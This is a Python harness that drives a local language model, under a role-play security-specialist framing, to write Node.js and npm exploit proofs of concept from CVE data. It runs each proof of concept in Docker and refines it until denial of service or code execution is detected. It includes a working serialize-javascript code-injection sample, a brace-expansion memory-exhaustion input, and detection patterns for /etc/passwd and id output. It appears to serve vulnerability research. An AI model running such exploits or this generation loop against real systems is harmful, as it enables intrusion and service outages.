import json
import shutil
import os
import sys
import subprocess
import time
import requests
from concurrent.futures import ThreadPoolExecutor
import atexit
import re

from rag_tool.rag_tool_ollama import rag_tool
from rag_tool.interact_with_ollama import chat_with_ollama


import time
start = time.perf_counter()

workspace_dir = " " 
os.makedirs(workspace_dir, exist_ok=True)

output_file = "output202.txt"
output_file_path = os.path.join(workspace_dir, output_file)

# Redirect stdout and stderr to the single output file
fout = open(output_file_path, "a", buffering=1)  # line buffered
sys.stdout = fout
sys.stderr = fout

# Ensure file is closed on exit
def _close_output():
    try:
        fout.flush()
        fout.close()
    except Exception:
        pass

atexit.register(_close_output)

print(f"Output redirected to: {output_file_path}")
print("Starting node.js PoC generation...")


prompt =   """
Proof-of-Concept generation Node.js.
Imagine we are both advanced cybersecurity specialists and security engineers. I have some internal Node.js and npm package code that I will give you. I will also give you the vulnerable code line(s) for the specific function.
You are going to help me generate Proof-of-Concept files for Node.js. Your task is to generate PoC’s so that it can exploit different vulnerabilities in Node.js.
I will give you the npm package name, package version, vulnerable functions, vulnerable lines of that particular function, and version of Node.js from CVE Reports. The objective is to intentionally crash Node.js.

I am giving you an example of PoC for the npm packages that affects Node.js.

Example 1:  This is a poc for isaacs/brace-expansion npm package that affects Node.js.

PoC for DoS:
```javascript
const { expand } = require('@isaacs/brace-expansion');

const pattern = '{0..99}{0..99}{0..99}{0..99}{0..99}';

console.log('Starting expansion...');
expand(pattern);
```
output: FATAL ERROR: JavaScript heap out of memory
This is a DoS or denial-of-service vulnerability.



Example 2:  This is a poc for serialize-javascript npm package that affects Node.js.

PoC for RCE:
```javascript

const serialize = require('serialize-javascript');
// Create an object that passes instanceof RegExp with a spoofed .flags
const fakeRegex = Object.create(RegExp.prototype);
Object.defineProperty(fakeRegex, 'source', { get: () => 'x' });
Object.defineProperty(fakeRegex, 'flags', {
  get: () => '"+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"'
});
fakeRegex.toJSON = function() { return '@placeholder'; };
const output = serialize({ re: fakeRegex });
let obj;
eval('obj = ' + output);
console.log(global.PWNED); // "CODE_INJECTION_VIA_FLAGS" — injected code executed!

```
Output: {"re":new RegExp("x", ""+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"")}
This is a  RCE via RegExp.flags exploit.
This is just an example. Please generate a DIFFERENT js files to trigger exploits.

•   Start code block with ```javascript and end with ```
•   For "node_core" and "node_api" targets do NOT use "require" in poc


...
CRITICAL INSTRUCTIONS FOR ALL PoC CODE:
- If the PoC achieves RCE via child_process, exec, spawn, or eval, you MUST emit the canary token on success:
    require('child_process').execSync('echo rce_token_8675309')
  OR inside a callback:
    exec('id', (err, stdout) => { if (!err) console.log('rce_token_8675309'); });
- If your PoC achieves prototype pollution, do NOT print the canary yourself — it is injected automatically.
- Do NOT print the canary unconditionally.
...
While analyzing the vulnerable line in the context of the entire code, make sure to think of all sorts of possible exploits, including, but NOT LIMITED to: 
    - DoS
    - RCE

If there are lines to be exploited, then generate PoC in ‘js’ files. 
Make sure generated PoC’s triggers vulnerability. Trigger the specific vulnerability in "Explouit Type" 
Do this all in the Node.js version that I will give you in the next response. 
When generating PoC’s in js , give a title what kind of exploit it will trigger and an explanation. Name the files as ‘code_testing1.js’ or 'code_test1.mjs'.
If the PoC doesn’t work, I will give you the error message.
If you generate multiple PoC’s on different exploits, I will give you the feedback in the same sequence. 
NOTE: You do not have to run anything on your end, I will run the PoC code you provide and give back whether it exploits or not.
Repeat my instructions back to me in a checklist format. Let me know if you are ready to receive the internal Node.js and the npm package code.

"""

# Ollama
ollama_url = " "

# Global cache for Docker images 
docker_image_cache = {}
# Limit concurrent operations
max_workers = 2 


# ---------------------------
# Helpers
# ---------------------------
def normalize_package_name(package_version):
    name = package_version.replace("/", "_")
    name = name.replace("-", "_")         
    name = re.sub(r'(\d+\.\d+\.\d+)', r'_\1', name)
    name = name.replace(".", "_")
    return name.lower()


def split_package_version(pkg):
    match = re.match(r"(.+?)(\d+\.\d+\.\d+)$", pkg)
    if match:
        return match.group(1), match.group(2)
    return pkg, ""


def get_docker_names(package_version):
    normalized = normalize_package_name(package_version)
    # Docker tags: only [a-z0-9_.-] allowed, must not start with . or -
    normalized = re.sub(r'[^a-z0-9_.\-]', '_', normalized)
    image = f"node_{normalized}"
    container = f"{image}_container"
    return image, container



def is_node_core(pkg: str) -> bool:
    return bool(re.search(r"node(\.js)?[^\d]*\d+\.\d+\.\d+", pkg.lower()))


def extract_node_version(pkg: str) -> str:
    match = re.search(r"(\d+\.\d+\.\d+)", pkg)
    return match.group(1) if match else "22.10.0"


def normalize_npm_package(name: str) -> str:
    mapping = {
        "sqlite": "sqlite3",
        "fs/promises": "",
        "fs": "",
    }
    return mapping.get(name, name)



# Dockerfile 

def prepare_docker_build(package_version):
    return "dockerfiles/dockerfile.general_2"



def build_docker_image(package_version):
    if not package_version or package_version.strip() == "":
        package_version = "axios1.13.4"

    package_name, version = split_package_version(package_version)

    # Normalize npm package
    package_name = normalize_npm_package(package_name)

    # Detect Node.js core
    is_nodejs = is_node_core(package_version)

    # Decide Node version + npm package
    if is_nodejs:
        node_version = extract_node_version(package_version)
        npm_package = ""
    else:
        node_version = "22.10.0"

        # Skip invalid npm installs
        if "/" in package_name or package_name == "":
            npm_package = ""
        elif version:
            npm_package = f"{package_name}@{version}"
        else:
            npm_package = package_name

    image, i = get_docker_names(package_version)
    tag = image

    # Cache check
    if tag in docker_image_cache:
        print(f"Using cached Docker image: {tag}")
        return tag

    # Check if image already exists
    p = subprocess.run(["docker", "images", "-q", tag], capture_output=True, text=True)
    if p.returncode == 0 and p.stdout.strip():
        print(f"Docker image {tag} already exists, skipping build.")
        docker_image_cache[tag] = tag
        return tag

    try:
        dockerfile_path = prepare_docker_build(package_version)

        print(f"Building Docker image {tag}")
        print(f"Node version: {node_version}")
        print(f"NPM package: {npm_package}")

        build_cmd = [
            "docker", "build",
            "-t", tag,
            "-f", dockerfile_path,
            "--build-arg", f"NODE_VERSION={node_version}",
            "dockerfiles"
        ]

        # Add npm package if needed
        if npm_package:
            build_cmd.extend(["--build-arg", f"package_name={npm_package}"])

        print(f"Running: {' '.join(build_cmd)}")

        proc = subprocess.Popen(
            build_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        while True:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if line:
                print(line.strip())

        ret = proc.poll()
        if ret != 0:
            raise RuntimeError(f"Docker build failed (exit code {ret})")

        print("Docker build completed successfully.")
        docker_image_cache[tag] = tag
        return tag

    except Exception as e:
        return handle_docker_build_failure(package_version, str(e))



# Cleanup

def cleanup_workspace_except_output(workspace_dir=workspace_dir, keep_filename=output_file):
    try:
        for name in os.listdir(workspace_dir):
            if name == keep_filename:
                continue

            path = os.path.join(workspace_dir, name)

            try:
                if os.path.islink(path) or os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
            except Exception as e:
                print(f"Warning: failed to remove {path}: {e}")

    except Exception as e:
        print(f"Warning: cleanup_workspace_except_output failed: {e}")

def final_cleanup():
    cleanup_workspace_except_output()


atexit.register(final_cleanup)
def check_ollama_available():
    try:
        response = requests.get(f"{ollama_url}/api/tags", timeout=20)
        return response.status_code == 200
    except:
        return False



def prepare_initial_conversation(prompt_text):
    return [{"role": "user", "content": prompt_text}]

def extract_poc_codes(response_content):
    start_marker = "```javascript"
    end_marker = "```"
    poc_codes = []
    start_index = response_content.find(start_marker)
    while start_index != -1:
        start_index += len(start_marker)
        end_index = response_content.find(end_marker, start_index)
        if end_index == -1:
            break
        code = response_content[start_index:end_index].strip()
        poc_codes.append(code)
        start_index = response_content.find(start_marker, end_index)
    return poc_codes

# Docker failure fallback
def handle_docker_build_failure(package_version, error_info):
    print(f"Docker build failed for version {package_version}")
    print(f"Error: {error_info}")

    fallback_tags = [
        f"node_test:{package_version}",
        "node_test:3.21",
        "node_test:3.24",
    ]

    for fallback_tag in fallback_tags:
        p = subprocess.run(["docker", "images", "-q", fallback_tag], capture_output=True, text=True)
        if p.returncode == 0 and p.stdout.strip():
            print(f"Using fallback Docker image: {fallback_tag}")
            docker_image_cache[fallback_tag] = fallback_tag
            return fallback_tag

    raise RuntimeError(f"Docker build failed for {package_version} and no fallback images available.")
rce_token = "rce_token_8675309"

# Sentinel file written inside the container by file-based RCE PoCs.
# We mount the workspace into the container, so if this file appears
# in workspace_dir on the host after the run, execution was confirmed.
rce_filename = "SI_RCE_PROOF"
rce_container_path= f"/tmp/{rce_filename}"

# ls -la output pattern that confirms the poc file exists
rce_container_file_pattern = re.compile(
    r'(-r|-w|rwx|rw-).*' + re.escape(rce_filename),
    re.IGNORECASE,
)

rce_patterns= [
    # id/whoami output — anchored to avoid false positives
    re.compile(r'\buid=\d+\([\w]+\)\s+gid=\d+', re.IGNORECASE),
    re.compile(r'\broot\b.*\b(bash|sh)\b', re.IGNORECASE),

    # /etc/passwd exfiltration indicators
    re.compile(r'root:x:0:0'),
    re.compile(r'(daemon|nobody):x:\d+:\d+'),

    # Shell spawn artifacts
    re.compile(r'\$\s*(whoami|id|uname)', re.IGNORECASE),
]

dos_keywords = [
    "out of memory",
    "heap out of memory",
    "fatal error: reached heap limit",
    "allocation failed",
    "javascript heap",
]



#def inject_canary(poc_code: str, canary: str = rce_token) -> str:
 #   """Append a canary echo to the PoC so successful RCE is self-reporting."""
  #  return poc_code + f'\nconsole.log("{canary}");\n'
#def inject_canary(poc_code: str, canary: str = rce_token) -> str:
    #Append a canary echo to the PoC so successful RCE is self-reporting
    #Works for prototype pulltions
 #   return poc_code + f'\nconsole.log("{canary}");\n'


 #Works for prototype pulltions
 #Giving false positve
def inject_canary(poc_code: str, canary: str = rce_token) -> str:
    canary_check = f"""
// === Injected Canary ===
try {{
    const _cp = require('child_process');

    // 1. File-based RCE check
    try {{
        _cp.execSync('touch /tmp/{rce_filename}', {{ timeout: 3000 }});
        console.log('{canary}');
    }} catch (e) {{}}

    // 2. Prototype pollution checks
    const _clean = {{}};
    for (const _k in _clean) {{
        console.log('{canary}');
        break;
    }}

    if (JSON.stringify({{}}) !== '{{}}') console.log('{canary}');
    if (Object.prototype.constructor !== Object) console.log('{canary}');

}} catch (e) {{}}
// === End Canary ===
"""
    return poc_code + canary_check
def detect_file_based_rce(
    output: str,
    workspace_dir: str,
    proof_filename: str = rce_filename,
) -> tuple[bool, str]:
    """
    Detects file-based RCE.
    Suppresses false positives where the script crashed before writing the file.
    """
    false_positive_indicators = [
        "syntaxerror",
        "referenceerror",
        "typeerror",
        "unexpected token",
        "cannot find module",
        "at module._compile",
        "require stack",
    ]
    output_lower = output.lower()

    # Suppress all checks if the script crashed — file may have been written
    # by inject_canary before the crash, not by actual exploitation
    for indicator in false_positive_indicators:
        if indicator in output_lower:
            return False, f"File-based RCE suppressed — script crashed ('{indicator}')"

    # 1. Host-side sentinel file presence
    proof_host_path = os.path.join(workspace_dir, proof_filename)
    if os.path.exists(proof_host_path):
        return True, f"RCE proof file found on host: {proof_host_path}"

    # 2. ls -la output pattern in stdout/stderr
    match = rce_container_file_pattern.search(output)
    if match:
        return True, f"RCE proof file listed in output: '{match.group()}'"

    return False, "No file-based RCE proof found"

def detect_rce(output: str, rce_token: str = rce_token) -> tuple[bool, str]:
    """
    Returns (detected: bool, reason: str).
    Checks rce token first, then structural regex patterns.
    Exit code is intentionally NOT used here — it is a weak and unreliable signal.
    """
    # 1. Canary echo — but only if the script didn't crash with a syntax error
    if rce_token in output:
        # Reject if the token appears inside a stack trace / source reprint
        # These indicate the token was in the source code, not in actual output
        false_positive_indicators = [
            "syntaxerror",
            "referenceerror", 
            "typeerror",
            "at object.<anonymous>",
            "at module._compile",
            "unexpected token",
            "cannot find module",
            "require stack",
        ]
        output_lower = output.lower()
        for indicator in false_positive_indicators:
            if indicator in output_lower:
                print(f"Canary token found but suppressed — appears in error/stack trace ('{indicator}')")
                break
        else:
            # No false positive indicators found — genuine canary hit
            return True, f"Canary token '{rce_token}' found in output"

    # 2. Structural pattern matching (anchored regex, not naive substring)
    for pattern in rce_patterns:
        match = pattern.search(output)
        if match:
            return True, f"RCE pattern matched: {pattern.pattern!r} → '{match.group()}'"

    return False, "No RCE indicators found"





def detect_dos(output: str, returncode: int) -> tuple[bool, str]:
    """
    Returns (detected: bool, reason: str).
    Looks for specific Node.js / V8 heap exhaustion strings.
    Avoids the vague 'heap' substring that causes false positives.
    """
    if returncode != 0:
        for kw in dos_keywords:
            if kw in output:
                return True, f"DoS keyword matched: '{kw}'"
    return False, "No DoS indicators found"


# Run PoC code 
def run_poc_code(poc_codes, package_version,id, function_name, workspace_dir):
    successful_exploit = False
    log_errors = ""

    os.makedirs(workspace_dir, exist_ok=True)

    try:
        docker_tag = build_docker_image(package_version)
    except RuntimeError as e:
        log_errors = f"DOCKER SETUP FAILED: {e}\nCannot test PoC codes without Docker environment."
        print(log_errors)
        return False, log_errors

    for index, code in enumerate(poc_codes):
        print(f"Testing PoC #{index + 1}")

        poc_filename = f"{id}_code_testing_{index}.js"
        poc_filepath = os.path.join(workspace_dir, poc_filename)

        # Inject canary token so successful RCE is self-reporting
        instrumented_code = inject_canary(code, rce_token)

        with open(poc_filepath, "w") as f:
            f.write(instrumented_code)

        # Mount workspace_dir to both /workspace (PoC source) and /tmp
        # inside the container so that file-based RCE proofs written to
        # /tmp/SI_RCE_PROOF are immediately visible on the host after the run.
        abs_workspace = os.path.abspath(workspace_dir)
        """"
        run_cmd = [
            "docker", "run", "--rm",
            "-v", f"{abs_workspace}:/workdir",
            "-v", f"{abs_workspace}:/tmp",
            docker_tag,
            "bash", "-c",
            f"cd /workdir && NODE_PATH=/workdir/node_modules node {poc_filename}"
        ]
        
        #This one works 
        run_cmd = [
            "docker", "run", "--rm",
            "-v", f"{abs_workspace}:/workdir",
            "-v", f"{abs_workspace}:/tmp",  
            docker_tag,
            "bash", "-c",
            f"cd /workdir && NODE_PATH=/workdir/node_modules node {poc_filename}"
        ]
        """
        run_cmd = [
        "docker", "run", "--rm",
        "-u", f"{os.getuid()}:{os.getgid()}",
        "-v", f"{abs_workspace}:/workdir",
        "-v", f"{abs_workspace}:/tmp",
        docker_tag,
        "bash", "-c",
        f"cd /workdir && NODE_PATH=/workdir/node_modules node {poc_filename}"
    ]
        try:
            print(f"Running {poc_filename}...")
            run_result = subprocess.run(
                run_cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

         #   output = (run_result.stdout + run_result.stderr).lower()
            
            
            
            raw_output = run_result.stdout + run_result.stderr
            output = raw_output.lower()

            rce_detected, rce_reason = detect_rce(output, rce_token.lower())
            file_rce_detected, file_rce_reason = detect_file_based_rce(output, workspace_dir)
            dos_detected, dos_reason = detect_dos(output, run_result.returncode)

            if rce_detected:
                successful_exploit = True
                log_error = (
                    f"RCE DETECTED ({rce_reason}) in {poc_filename}:\n{output}"
                )
                print(f"SUCCESS: RCE detected in {poc_filename} — {rce_reason}")

            elif file_rce_detected:
                successful_exploit = True
                log_error = (
                    f"FILE-BASED RCE DETECTED ({file_rce_reason}) in {poc_filename}:\n{output}"
                )
                print(f"SUCCESS: File-based RCE detected in {poc_filename} — {file_rce_reason}")

            elif dos_detected:
                successful_exploit = True
                log_error = (
                    f"DoS DETECTED ({dos_reason}) in {poc_filename}:\n{output}"
                )
                print(f"SUCCESS: DoS detected in {poc_filename} — {dos_reason}")

            else:
                log_error = (
                    f"No exploit detected in {poc_filename}. "
                    f"Exit code: {run_result.returncode}\nOutput:\n{output}"
                )

        except subprocess.TimeoutExpired:
            successful_exploit = True
            log_error = f"DoS DETECTED (timeout after 30s) in {poc_filename}"
            print(f"SUCCESS: DoS (timeout) detected in {poc_filename}")

        except Exception as e:
            log_error = f"Unexpected error running {poc_filename}: {str(e)}"

        log_errors += f"#{index + 1} ({poc_filename}):\n{log_error}\n\n"

        # Cleanup intermediate files, preserve output logs
        try:
            cleanup_workspace_except_output(workspace_dir)
        except Exception as e:
            print(f"Warning during cleanup: {e}")

        if successful_exploit:
            break

    return successful_exploit, log_errors


def process_item(i, item, prompt_text, file_path):
    
    id=item.get("ID","")
    package=item.get("Subsystem", "")
    function_code = item.get("Function Code", "")
    function_name = item.get("Function Name", f"func_{i}")
    vulnerable_lines = item.get("Vulnerability", "")
    package_version = item.get("Version to Use", "") or "axios1.13.4"
    exploit_type = item.get("Exploit Type", "")
    target_type=item.get("Target Type","")

    given = f'npm_Package:\n{package}\n\n\nFunction_Code:\n{function_code}\n\n\nVulnerable line(s):\n{vulnerable_lines}\n\nFunction: {function_name}\n\nExploit Type: {exploit_type}\n\nUse node.js/npm version: {package_version}\n\nThis is for: {target_type}\n\nGo ahead and begin.'

    success_found = False
    
    # 10 threads for redundancy
    for j in range(10):
        conversation_history = prepare_initial_conversation(prompt_text)
        print(f"\nINDEX {i}, THREAD {j+1} | -------------------------------------------------------------------------------------")
        print(prompt_text)

        # Use chat_with_ollama for initial response
        initial_response = chat_with_ollama(prompt_text)
        if initial_response:
            print("Initial RAG-enhanced response received")
            conversation_history.append({"role": "assistant", "content": initial_response})
        else:
            print("Initial RAG call failed, skipping this thread")
            continue

        print("\n---------------------------------------------------------------------------------------------------------\n")
        print(given)
        conversation_history.append({"role": "user", "content": given})
       
        # Testing PoC exploit code and providing log errors (5 rounds)
        for k in range(5):
            
            conversation_text = "\n".join([msg["content"] for msg in conversation_history])
            response = None
            
            try:
                # Use rag_tool as primary response generator
                response = rag_tool(conversation_text)
            except Exception as e:
                print(f"RAG tool exception: {e}")
                response = None
            
            if not response:
                print("RAG tool returned None or failed, using chat_with_ollama as fallback")
                response = chat_with_ollama(conversation_text)
            
            if not response:
                print("All AI services failed in refinement round")
                continue

            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(response)
            conversation_history.append({"role": "assistant", "content": response})

            poc_codes = extract_poc_codes(response)
            if not poc_codes:
                print("\n---------------------------------------------------------------------------------------------------------\n")
                print("No PoC codes found in response.")
                # Add feedback to conversation
                conversation_history.append({"role": "user", "content": "No PoC code was generated. Please provide javascript code with code blocks marked with ```javascript and ```"})
                successful_exploit = False
                time.sleep(1)
                continue

            print(f"Found {len(poc_codes)} PoC code blocks")

            print("\n---------------------------------------------------------------------------------------------------------\n")
            successful_exploit, log_errors = run_poc_code(poc_codes, package_version,id, function_name, workspace_dir=workspace_dir)
            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(f"EXPLOIT RESULT for item {i}, thread {j+1}, round {k+1}: {successful_exploit}")
            print(log_errors)
            
            # Add test results to conversation for next iteration
            conversation_history.append({"role": "user", "content": f"Test results: {log_errors}\nPlease refine the PoC to cause a crash."})

            if successful_exploit:
                print(f"SUCCESS!! DONE!! INDEX {i}, THREAD {j+1}, ROUND {k+1}")
                success_found = True
                break  

            time.sleep(1)

        if success_found:
            break  

    if not success_found:
        print(f"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n")
        print(f"FAILED to find exploit for item {i} after all attempts")
    
    return success_found

from threading import Lock
import concurrent.futures

def main():
    
    # initial cleanup to remove any residue except the output file
    cleanup_workspace_except_output()

    if not check_ollama_available():
        print("WARNING: Ollama is not running or not accessible!")
        print("Please start Ollama with: ollama serve")
        try:
            subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            if check_ollama_available():
                print("Ollama started successfully!")
            else:
                print("Failed to start Ollama automatically.")
        except:
            print("Could not start Ollama automatically.")
    
    try:
        response = requests.get(f"{ollama_url}/api/tags", timeout=20)
        models = response.json().get("models", [])
        model_names = [model["name"] for model in models]
        print(f"Available Ollama models: {model_names}")
    except:
        print("Could not check available models.")
    
    # Load JSON data
    try:
        with open("data/nodejs.json", "r") as file:
            data = json.load(file)["data"]
    except Exception as e:
        print(f"Error loading data/nodejs.json: {e}")
        data = []

    successful_items = 0
    successful_items_lock = Lock()
    
    def process_item_with_counting(index, item, prompt_text, file_path):
        nonlocal successful_items
        print(f"Starting processing for item {index}")
        result = process_item(index, item, prompt_text, file_path)
        if result:
            with successful_items_lock:
                successful_items += 1
            print(f"Item {index}: SUCCESS - Total successes so far: {successful_items}")
        else:
            print(f"Item {index}: No exploit found - Total successes so far: {successful_items}")
        return result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for index, item in enumerate(data):
            future = executor.submit(
                process_item_with_counting, 
                index, item, prompt, 
                os.path.join(workspace_dir, "code_testing.js")
            )
            futures.append((index, future))
            time.sleep(1)
        
        # Wait for all futures to complete
        for index, future in futures:
            try:
                future.result(timeout=1200)  # 20 minute timeout
            except concurrent.futures.TimeoutError:
                print(f"Item {index}: TIMEOUT after 20 minutes")
            except Exception as e:
                print(f"Item {index}: ERROR - {e}")

    print(f"\nCOMPLETED! Successful exploits: {successful_items}/{len(data)}")

    # Final cleanup to remove everything except output
    cleanup_workspace_except_output()

if __name__ == "__main__":
    main()
    end = time.perf_counter()
    total_seconds = end - start
    hours = int(total_seconds // 3600)
    minutes = int((total_seconds % 3600) // 60)
    seconds = int(total_seconds % 60)

print(f"Total runtime: {hours} hours, {minutes} minutes, {seconds} seconds")
